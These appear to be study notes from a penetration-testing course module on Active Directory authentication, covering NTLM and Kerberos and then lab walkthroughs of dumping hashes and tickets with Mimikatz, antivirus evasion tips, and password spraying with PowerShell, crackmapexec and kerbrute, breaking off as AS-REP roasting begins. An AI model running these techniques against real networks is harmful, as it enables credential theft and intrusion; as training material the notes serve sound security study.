# Attacking Active Directory Authentication
Having enumerated user accounts, group memberships, and registered Service Principal Names in the previous Module _Active Directory Introduction and Enumeration_, let's now attempt to use this information to compromise Active Directory
+ In this Module, we'll first explore authentication mechanisms of Active Directory (AD) and learn where Windows caches authentication objects such as password hashes and tickets
+ Next, we'll get familiar with the attack methods targeting these authentication mechanisms
+ We can use these techniques during different phases of a penetration test to obtain user credentials and access to systems and services
+ For the purpose of this Module, we'll target the same domain (_corp.com_) as in the previous Module

## Understanding Active Directory Authentication
Active Directory supports multiple authentication protocols and techniques that implement authentication to Windows computers as well as those running Linux and macOS
+ Active Directory supports several older protocols including _WDigest_
+ While these may be useful for older operating systems like Windows 7 or Windows Server 2008 R2, we will only focus on more modern authentication protocols in this Learning Unit

In this Learning Unit, we'll discuss the details of _NTLM_ and _Kerberos_ authentication
+ In addition, we'll explore where and how AD credentials are cached on Windows systems

### NTLM Authentication
In _Password Attacks_, we briefly discussed what NTLM is and where to find its hashes
+ In this section, we'll explore NTLM authentication in the context of Active Directory

NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname) or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server
+ Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos

#### NTLM Authentication Quick 
The NTLM authentication protocol consists of seven steps:
![[Pasted image 20240103184044.png]]
1. Client calculates the NTLM hash from the user password, often using MD4
2. Client sends the username to the application server 
3. Application server sends a nonce (random value)
4. Client encrypts the nonce with the NTLM hash and sends it to the application server, called the response 
5. Application server sends the response (nonce encrypted with the NTLM hash), username, and nonce to the domain controller
6. Domain controller encrypts the nonce with the NTLM hash of the username (which it has saved), and compares it to the response from the application server
7. Domain controller sends an authentication approval to the application server if the comparison is equal 

#### NTLM Authentication Detailed 
In the first step, the computer calculates a cryptographic hash, called the _NTLM hash_, from the user's password
+ Next, the client computer sends the username to the server, which returns a random value called the _nonce_ or _challenge_ 
+ The client then encrypts the nonce using the NTLM hash, now known as a _response_, and sends it to the server

The server forwards the response along with the username and the nonce to the domain controller
+ The validation is then performed by the domain controller, since it already knows the NTLM hash of all users
+ The domain controller encrypts the nonce itself with the NTLM hash of the supplied username and compares it to the response it received from the server
+ If the two are equal, the authentication request is successful

As with any other cryptographic hash, NTLM cannot be reversed
+ However, it is considered a _fast-hashing_ algorithm since short passwords can be cracked quickly using modest equipment
+ By using cracking software like Hashcat with top-of-the-line graphic processors, it is possible to test over 600 billion NTLM hashes every second
+ This means that eight-character passwords may be cracked within 2.5 hours and nine-character passwords may be cracked within 11 days

However, even with its relative weaknesses, completely disabling and blocking NTLM authentication requires extensive planning and preparation as it's an important fallback mechanism and used by many third-party applications
+ Therefore, we'll encounter enabled NTLM authentication in a majority of assessments

Now that we've briefly covered NTLM authentication, in the next section we'll begin exploring Kerberos
+ Kerberos is the default authentication protocol in Active Directory and for associated services

### Kerberos Authentication
The Kerberos authentication protocol used by Microsoft is adopted from Kerberos version 5 created by MIT
+ Kerberos has been used as Microsoft's primary authentication mechanism since Windows Server 2003
+ While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system

A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself, as discussed in the previous section
+ On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a _Key Distribution Center_ (KDC)
+ The client starts the authentication process with the KDC and not the application server
+ A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers

Quick pros list of Kerberos
+ Passwords are never sent across the network
+ Encryption keys are never directly exchanged
+ You and the application can mutually authenticate each other 
+ Many organizations use it as the basis for single sign on
+ Named after the dog who guards the underworld in greek mythology 

#### Kerberos Authentication quick
The client authentication process at a high level is shown below:
![[Pasted image 20240103195143.png]]

##### Kerberos Realm
![[Pasted image 20240103203653.png]]

##### Authentication steps
![[Pasted image 20240103211929.png]]
1. **AS REQ**: User to authentication server <mark style="background: #FF5582A6;">[unencrypted]</mark>
	+ Contains the following user message
		+ User Name/ID `ROB`
		+ Service Name/ID `CRM`
		+ User IP address `1|N|null`
		+ Requested lifetime for TGT
	+ The authentication server will then look at the user ID, being part of the KDC, it will compare that user ID to its list, and gets the corresponding secret key
2. **AS REP** Authentication Server to User <mark style="background: #BBFABBA6;">[encrypted]</mark>
	+ Contains two messages, encrypted separately 
		+ A->U message <mark style="background: #BBFABBA6;">[User Secret Key encrypted]</mark>
			+ ID of Ticket Granting Server (TGS)
			+ Timestamp 
			+ Lifetime of authentication 
			+ Ticket Granting Server (TGS) Session Key (random symmetric key)
		+ Ticket Granting Ticket <mark style="background: #BBFABBA6;">[TGS Secret Key encrypted]</mark>
			+ User Name/ID
			+ ID of Ticket Granting Server (TGS)
			+ Timestamp
			+ User IP address
			+ Lifetime for TGT
			+ Ticket Granting Server (TGS) Session Key (random symmetric key)
3. **TGS REQ**: User to Ticking Granting Server
	+ The user will generate its secret key with the following 
		+ Client Secret Key = HashingFunction(`User Password` + `Salt` + `Key Version #`)
		+ Salt is usually: `username@realmname`
	+ The Client key will decrypt A->U message
		+ Now has access to the ID of Ticket Granting Server (TGS) and the TGS Session Key
	+ The client will then craft the following messages, and send it to the Ticket Granting Server, along with the Ticket Granting Ticket still <mark style="background: #BBFABBA6;">[encrypted by the TGS Secret key ]</mark>
		+ U->TGS <mark style="background: #FF5582A6;">[unencrypted]</mark>
			+ Service Name/ID `CRM`
			+ Requested lifetime for ticket
		+ User Authenticator <mark style="background: #BBFABBA6;">[TGS Session Key encrypted]</mark>
			+ User Name/ID `Rob`
			+ Timestamp
4. **TGS REP** Ticket Granting Server to User
	+ First will look at the U->TGS <mark style="background: #FF5582A6;">[unencrypted]</mark> message and check that there is a matching service ID, if so, will grab a copy of the corresponding service secret key
	+ Will decrypt the Ticket Granting Ticket with the TGS Secret Key
		+ Will now have the TGS Session Key
	+ Will decrypt the user authenticator message with the TGS Session Key 
	+ TGS will now begin validating the following 
		+ The User Name/ID match in the TGT and User authenticator 
		+ Timestamps within 2 minutes 
		+ Verifies IP address of the user 
		+ Verifies the TGT has not expired 
	+ If everything is validated 
		+ Will verify the the TGS is not already cached to protect the user from a replay attack
		+ If not already there, the it will add the new user authenticator 
	+ The TGS will now craft the following messages to the user,  and then send it to the user
		+ TGS->U <mark style="background: #BBFABBA6;">[TGS Session Key encrypted]</mark>
			+ Service Name/ID
			+ Timestamp
			+ Lifetime
			+ Service Session Key (Random symmetric key)
		+ Service Ticket <mark style="background: #BBFABBA6;">[Service Secret Key encrypted]</mark>
			+ User Name/ID
			+ Service Name/ID
			+ Timestamp
			+ User IP address
			+ Lifetime for Service Ticket
			+ Service Session Key
5. **AP REQ**: User to Service
	+ The user will use the TGS Session key (which it previously got from the authentication server) to decrypt the TGS->U message
		+ Will get a copy of the service session key 
	+ Will now craft the following messages, and send it to the service along with the Service Ticket which is still <mark style="background: #BBFABBA6;">[Service Secret Key encrypted]</mark>
		+ Will create a new User Authenticator (for the service), and <mark style="background: #BBFABBA6;">[encrypt it with the service session key] </mark>
			+ User Name/ID
			+ Timestamp
6. **AP REP**: Service to User
	+ Service decrypts the Service ticket with its secret key 
		+ Now has access to the service session key
	+ Will use that to decrypt the user authenticator message
	+ Will now validate the following:
		+ User Name/ID match
		+ Timestamps are within two minutes 
		+ User IP address is correct
		+ Verify the service ticket is not expired
		+ Ensure the that the user authenticator is not already in the cache (for replay protection), if it is not it will add it
	+ The service will now craft the following message, and send it to the user
		+ Service authenticator <mark style="background: #BBFABBA6;">[encrypted with the Service Session Key]</mark>
			+ Service Name/ID
			+ Timestamp
7. User verification of Service
	+ Will decrypt the Service authenticator with the Service Session key it got previously from the TGS
		+ Will now verify that the service name/id is the service it was expecting, as well as the timestamp 
	+ Will now cache a copy of the encrypted service ticket, as well as validate that one is not already there (protecting from a replay attack)

#### Kerberos Authentication detailed
Let's review this process in detail
+ First, when a user logs in to their workstation, an _Authentication Server Request_ (AS-REQ) is sent to the domain controller
+ The domain controller, acting as a KDC, also maintains the Authentication Server service
+ The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user and their username
+ When the domain controller receives the request, it looks up the password hash associated with the specific user in the **ntds.dit** file and attempts to decrypt the timestamp 
+ If the decryption process is successful and the timestamp is not a duplicate, the authentication is considered successful
	+ If the timestamp is a duplicate, it could indicate evidence of a potential replay attack

Next, the domain controller replies to the client with an _Authentication Server Reply_ (AS-REP)
+ Since Kerberos is a stateless protocol, the AS-REP contains a _session key_ and a _Ticket Granting Ticket_ (TGT)
+ The session key is encrypted using the user's password hash and may be decrypted by the client and then reused
+ The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key
+ To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the _krbtgt_ account) known only to the KDC and cannot be decrypted by the client
+ Once the client has received the session key and the TGT, the KDC considers the client authentication complete
+ By default, the TGT will be valid for ten hours, after which a renewal occurs
+ This renewal does not require the user to re-enter their password

When the user wishes to access resources of the domain, such as a network share or a mailbox, it must again contact the KDC
+ This time, the client constructs a _Ticket Granting Service Request_ (TGS-REQ) packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT
+ Next, the ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC
+ The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request

At this point the KDC performs several checks
1. The TGT must have a valid timestamp.
2. The username from the TGS-REQ has to match the username from the TGT.
3. The client IP address needs to coincide with the TGT IP address

If this verification process succeeds, the ticket-granting service responds to the client with a _Ticket Granting Server Reply_ (TGS-REP). This packet contains three parts:
1. The name of the service for which access has been granted.
2. A session key to be used between the client and the service.
3. A _service ticket_ containing the username and group memberships along with the newly-created session key

The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT
+ The service ticket is encrypted using the password hash of the service account registered with the service in question

Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins
+ First, the client sends the application server an _Application Request_ (AP-REQ), which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself
+ The application server decrypts the service ticket using the service account password hash and extracts the username and the session key
+ It then uses the latter to decrypt the username from the _AP-REQ_
+ If the _AP-REQ_ username matches the one decrypted from the service ticket, the request is accepted
+ Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service

This protocol may seem complicated and perhaps even convoluted, but it was designed to mitigate various network attacks and prevent the use of fake credentials
+ Now that we have discussed the foundations of both NTLM and Kerberos authentication, let's explore various cached credential storage and service account attacks

### Cached AD Credentials
To lay the foundation for cached storage credential attacks and lateral movement vectors in the Module _Lateral Movement in Active Directory_, we must first discuss the various password hashes used with Kerberos and show how they are stored
+ We already covered some of the following information in the _Password Attacks_ Module
+ In this section, we'll focus on cached credentials and tickets in the context of AD

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request
+ In modern versions of Windows, these hashes are stored in the _Local Security Authority Subsystem Service_ (LSASS)memory space
+ If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions

Although this is the end goal of our AD attack, the process is not as straightforward as it seems
+ Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target

Because of this, we often have to start our attack with a local privilege escalation in order to retrieve the stored hashes
+ To make things even more tricky, the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key

Nevertheless, since the extraction of cached credentials is a large attack vector against Windows and Active Directory, several tools have been created to extract the hashes
+ The most popular of these tools is _Mimikatz_

Let's try to use Mimikatz to extract domain hashes on our Windows 11 system
+ In the following example, we will run Mimikatz as a standalone application
+ However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the _Antivirus Evasion_ Module instead
	+ For example, execute Mimikatz directly from memory using an injector like PowerShell, or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz

Since the _jeff_ domain user is a local administrator on CLIENT75, we are able to launch a PowerShell prompt with elevated privileges
+ First, let's connect to this machine as _jeff_ with the password _HenchmanPutridBonbon11_ over RDP:
```
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75         
```

Once connected, we start a PowerShell session as Administrator
+ Administrator. From this command prompt, we can start Mimikatz and enter **`privilege::debug`** to engage the _SeDebugPrivlege_ privilege, which will allow us to interact with a process owned by another account

```
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug
Privilege '20' OK
```

Now we can run **`sekurlsa::logonpasswords`** to dump the credentials of all logged-on users with the _Sekurlsa_ module
+ This should dump hashes for all users logged on to the current workstation or server, _including remote logins_ like Remote Desktop sessions
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```

The output above shows all credential information stored in LSASS for the domain users _jeff_ and _dave_, including cached hashes
+ An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional _LSA Protection_
+ The LSA includes the LSASS process
+ By setting a registry key, Windows prevents reading memory from this process
+ We'll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec's _Evasion Techniques and Breaching Defenses_ course, PEN-300

We can observe two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation
+ For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm
+ For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available
+ On older operating systems like Windows 7, or operating systems that have it manually set, **WDigest** will be enabled
+ When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes


Armed with these hashes, we could attempt to crack them and obtain the cleartext password as we did in _Password Attacks_
+ A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets
+ As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use
+ These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users

Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path **`\\web04.corp.com\backup`**
+ This will create and cache a service ticket
```
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering **`sekurlsa::tickets`**
```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```
+ The output shows both a TGT and a TGS
+ Stealing a TGS would allow us to access only particular resources associated with those tickets
+ Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain
+ We will discuss how to leverage stolen or forged tickets later on in this and the next Module

Mimikatz can also export tickets to the hard drive and import tickets into LSASS, which we will explore later

Before covering attacks on AD authentication mechanisms, let's briefly explore the use of _Public Key Infrastructure_ (PKI) in AD
+ Microsoft provides the AD role _Active Directory Certificate Services_ (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources

If a server is installed as a _Certification Authority_ (CA) it can issue and revoke digital certificates (and much more)
+ While a deep discussion on these concepts would require its own Module, let's focus on one aspect of cached and stored objects related to AD CS

For example, we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via _Smart Cards_
+ These certificates may be marked as having a _non-exportable private key_ for security reasons
+ If so, a private key associated with a certificate cannot be exported even with administrative privileges
+ However, there are various methods to export the certificate with the private key

We can rely again on Mimikatz to accomplish this. The _crypto_ module contains the capability to either patch the _CryptoAPI_ function with **`crypto::capi`** or _KeyIso_ service with **`crypto::cng`** making non-exportable keys exportable

As we've now covered in this section and in _Password Attacks_, Mimikatz can extract information related to authentication performed through most protocols and mechanisms, making this tool a real Swiss Army knife for cached credentials

## Performing Attacks on Active Directory Authentication
In the previous Learning Unit, we discussed NTLM and Kerberos authentication, as well as where we can find cached AD credentials and objects
+ In this Learning Unit, we'll explore various attacks in the context of these authentication mechanisms
+ The attack techniques are introduced independently from each other as they can be used in several different phases of a penetration test
+ For a majority of attacks, we'll also discuss ways of performing them from Windows and Linux alike, making us more flexible and able to adapt to a variety of real world assessment scenarios

### Password Attacks
In a previous Module, we examined several password attacks on network services and hashed information
+ Password attacks are also a viable choice in the context of AD to obtain user credentials
+ In this section, we'll explore various **AD password attacks**

Before exploring these attacks, we need to account for one important consideration
+ When performing a brute force or wordlist authentication attack, we must be aware of account lockouts
+ Too many failed logins may block the account for further attacks and possibly alert system administrators

To learn more about account lockouts, let's review the domain's account policy as domain user _jeff_ on `CLIENT75` 
+ We can connect to the system with the password _`HenchmanPutridBonbon11`_ via RDP
+ Next, we'll open a regular PowerShell window and execute **net accounts** to obtain the account policy:
```
net accounts
```
+ Example output:
```
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

There's a lot of great information available, but let's first focus on _Lockout threshold_, which indicates a limit of five login attempts before lockout
+ This means we can safely attempt four logins before triggering a lockout
+ Although this may not seem like many, we should also consider the _Lockout observation window_, which indicates that after thirty minutes after the last failed login, we can make additional attempts
+ With these settings, we could attempt 192 logins in a 24-hour period against every domain user without triggering a lockout, assuming the actual users don't fail a login attempt

An attack like this might consist of compiling a short list of very common passwords and leveraging it against a massive amount of users
+ Sometimes this type of attack can reveal quite a few weak account passwords in the organization

However, this would also generate a huge amount of network traffic
+ Let's review three kinds of password spraying attacks that have a higher chance of success in an AD environment

#### Password Spraying Using LDAP and ADSI
The first kind of password spraying attack uses LDAP and ADSI to perform a _low and slow_ password attack against AD users
+ In the Module _Active Directory Introduction and Enumeration_, we performed queries against the domain controller as a logged-in user with _DirectoryEntry_ 
+ However, we can also make queries in the context of a different user by setting the _DirectoryEntry_ instance

In the Module _Active Directory Introduction and Enumeration_, we used the _DirectoryEntry_ constructor without arguments, but we can provide three arguments, including the LDAP path to the domain controller, the username, and the password:
``` powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
+ If the password for the user account is correct, the object creation will be successful, as shown below:
```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
+ If the password is invalid, no object will be created and we will receive an exception, as shown below:
	+ To address this, let's change the password in the constructor to **`WrongPassword`**
	+ We'll note the clear warning that the user name or password is incorrect
```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_
+ This password spraying tactic is already implemented in the PowerShell script **`C:\Tools\Spray-Passwords.ps1`** on CLIENT75
+ The **-Pass** option allows us to set a single password to test, or we can submit a wordlist file using _-File_
+ We can also test admin accounts by adding the **-Admin** flag
+ The PowerShell script automatically identifies domain users and sprays a password against them:
```
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```
+ Example:
```
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> powershell -ep bypass
...

PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```
+ The password spraying was successful, providing us two valid sets of credentials with the password `_Nexus123!`_

#### Password Spraying Using SMB
The second kind of password spraying attack against AD users leverages SMB
+ This is one of the traditional approaches of password attacks in AD and comes with some drawbacks
+ For example, for every authentication attempt, a full SMB connection has to be set up and then terminated
+ As a result, this kind of password attack is very noisy due to the generated network traffic
+ It is also quite slow in comparison to other techniques

We can use **crackmapexec** on Kali to perform this kind of password spraying
+ We'll select **smb** as protocol and enter the IP address of any domain joined system such as `CLIENT75` (192.168.50.75)
+ Then, we can provide a list or single users and passwords to **-u** and **-p** 
+ In addition, we will enter the domain name for **-d** and provide the option **--continue-on-success** to avoid stopping at the first valid credential
+ For the purposes of this example, we'll create a text file named **users.txt** containing a subset of the domain usernames _dave_, _jen_, and _pete_ to spray the password _Nexus123!_ against
```
crackmapexec smb <IP> -u <USER_LIST> -p <PASSWORD> -d <DOMAIN> --continue-on-success
```
+ Example:
```
kali@kali:~$ cat users.txt
dave
jen
pete

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```
+ Above shows that crackmapexec identified the same two valid sets of credentials as **Spray-Passwords.ps1** did previously
+ By prepending the attempted credentials with a plus or minus, crackmapexec indicates whether or not each is valid

We should note that crackmapexec doesn't examine the password policy of the domain before starting the password spraying
+ As a result, we should be cautious about locking out user accounts with this method

As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has administrative privileges on the target system
+ For example, _dave_ is a local admin on CLIENT75
+ Will use crackmapexec with the password _Flowers1_ targeting this machine
```
kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com                       
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```
+ Above shows that crackmapexec added _Pwn3d!_ to the output, indicating that _dave_ has administrative privileges on the target system
+ In an assessment, this is an excellent feature to determine the level of access we have without performing additional enumeration

#### Password Spraying With a TGT
The third kind of password spraying attack we'll discuss is based on obtaining a TGT
+ For example, using _kinit_ on a Linux system, we can obtain and cache a Kerberos TGT
+ We'll need to provide a username and password to do this
+ If the credentials are valid, we'll obtain a TGT
+ The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response

We could use Bash scripting or a programming language of our choice to automate this method
+ Fortunately, we can also use the tool _kerbrute_, implementing this technique to spray passwords
+ Since this tool is cross-platform, we can use it on Windows and Linux

Let's use the Windows version in **`C:\Tools`** to perform this attack
+ To conduct password spraying, we need to specify the **passwordspray** command along with a list of usernames and the password to spray
+ We'll also need to enter the domain **corp.com** as an argument for **-d** 
+ As previously, we'll create a file named **`usernames.txt`** in **`C:\Tools`** containing the usernames _pete_, _dave_, and _jen_
```
.\kerbrute_windows_amd64.exe passwordspray -d <DOMAIN> <USER_LIST_FILE> "<PASSWORD>"
```
+ Example:
```
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```
+ Above shows that kerbrute confirmed that the password _Nexus123!_ is valid for _pete_ and _jen_
+ If you receive a network error, make sure that the encoding of **usernames.txt** is _ANSI_ 
	+ You can use Notepad's _Save As_ functionality to change the encoding

For crackmapexec and kerbrute, we had to provide a list of usernames
+ To obtain a list of all domain users, we can leverage techniques we learned in the Module _Active Directory Introduction and Enumeration_ or use the built-in user enumeration functions of both tools

In this section, we explored ways to perform password attacks in the context of AD
+ We discussed and practiced three different methods for password spraying attacks
+ These techniques are a great way to obtain valid credentials in the context of AD, especially if there is no lockout threshold set in the account policy
+ In the next two sections, we'll perform attacks that leverage hash cracking and often provide a higher success rate than password spraying

### AS-REP Roasting
As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ
+ Based on this request, the domain controller can validate if the authentication is successful
+ If it is, the domain controller replies with an AS-REP containing the session key and TGT
+ This step is also commonly referred to as _Kerberos preauthentication_ and prevents offline password guessing

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user
+ After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response
+ This attack is known as _AS-REP Roasting_ 

By default, the AD user account option _Do not require Kerberos preauthentication_ is disabled, meaning that Kerberos preauthentication is performed for all users
+ However, it is possible to enable this account option manually
+ In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly

Let's perform this attack from our Kali machine first, then on Windows
+ On Kali, we can use **impacket-GetNPUsers** to perform AS-REP roasting
+ We'll need to enter the IP address of the domain controller as an argument for **-dc-ip**, the name of the output file in which the AS-REP hash will be stored in Hashcat format for **-outputfile**, and **-request** to request the TGT

#### AS-REP Roasting With impacket on Linux
Finally, we need to specify the target authentication information in the format **domain/user**
+ This is the user we use for authentication
